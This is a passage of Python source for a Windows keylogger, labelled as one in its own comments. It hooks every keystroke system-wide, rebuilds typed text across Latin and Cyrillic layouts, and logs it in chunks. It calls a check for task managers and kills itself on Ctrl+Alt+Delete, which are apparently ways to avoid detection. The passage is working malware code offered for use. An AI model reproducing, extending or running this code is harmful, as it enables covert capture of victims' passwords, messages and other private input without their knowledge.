        len(line_buffer) - backspace_buffer_len = the number of symbols that we can safely backspace.
        we increment backspace_buffer_len variable only when we append technical stuff
        (time_buffer or window_buffer or <KEYS>): """
        backspace_buffer_len = len(line_buffer)

    key_pressed = ''

    # 3. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
    if event.name in ['left', 'right']:  # arrow keys  # 'home', 'end', 'up', 'down'
        key_pressed_list = list()
        if is_pressed_ctrl or is_pressed_r_ctrl:
            key_pressed_list.append('ctrl')
        if is_pressed_shift or is_pressed_r_shift:
            key_pressed_list.append('shift')
        key_pressed = '<' + '+'.join(key_pressed_list) + (
            '+' if len(key_pressed_list) > 0 else '') + event.name + '>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
    elif event.name in ['ctrl', 'alt', 'delete']:
        if keys_pressed == 'ctrl+alt+delete':
            os.kill(os.getpid(), 9)
            exit()
    elif event.name == 'space':
        key_pressed = ' '
    elif event.name in ['enter', 'tab']:
        key_pressed = '<TAB>' if event.name == 'tab' else '<ENTER>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
        log_it()  # pass event to other handlers
        return True
    elif event.name == 'backspace':
        if len(line_buffer) - backspace_buffer_len > 0:
            line_buffer = line_buffer[:-1]  # remove the last character
        else:
            line_buffer += '<BACKSPACE>'
            backspace_buffer_len = len(line_buffer)
    elif event.name == 'caps lock':  # CAPS LOCK
        upper_case = not upper_case
        capslock_on = not capslock_on
    elif event.name in ['shift', 'right shift']:  # SHIFT DOWN
        shift_on = True
        upper_case = update_upper_case()
    else:
        key_pressed = event.name
        if len(key_pressed) == 1:
            # if some normal character
            # 3.1. DETERMINE THE SELECTED LANGUAGE AND TRANSLATE THE KEYS IF NEEDED
            # There is a keyboard module bug: when we start a program in one layout and then switch to another,
            # the layout of hooked input DOES NOT change. So we need a workaround.
            language = detect_key_layout()
            global latin_into_cyrillic_trantab, cyrillic_layouts
            if 'English' in language and 'English' not in initial_language:
                # cyrillic -> latin reverse translation is required
                if ord(key_pressed) in cyrillic_into_latin_trantab:
                    key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])
            elif language in cyrillic_layouts and initial_language not in cyrillic_layouts:
                # latin -> cyrillic translation is required
                if ord(key_pressed) in latin_into_cyrillic_trantab:
                    key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])

            # apply upper or lower case
            key_pressed = key_pressed.upper() if upper_case else key_pressed.lower()
        else:
            # unknown character (eg arrow key, shift, ctrl, alt)
            return True  # pass event to other handlers

    # 4. APPEND THE PRESSED KEY TO THE LINE_BUFFER
    line_buffer += key_pressed

    # 5. DECIDE ON WHETHER TO LOG CURRENT line_buffer OR NOT:
    if len(line_buffer) >= CHAR_LIMIT:
        log_it()
    return True  # pass event to other handlers


def main():
    # KEYLOGGER STARTS
    if not os.name == "nt":
        return  # TODO: Linux, MacOS
    check_task_managers()
    keyboard.hook(key_callback)
    keyboard.wait()
    return


if __name__ == '__main__':
    main()
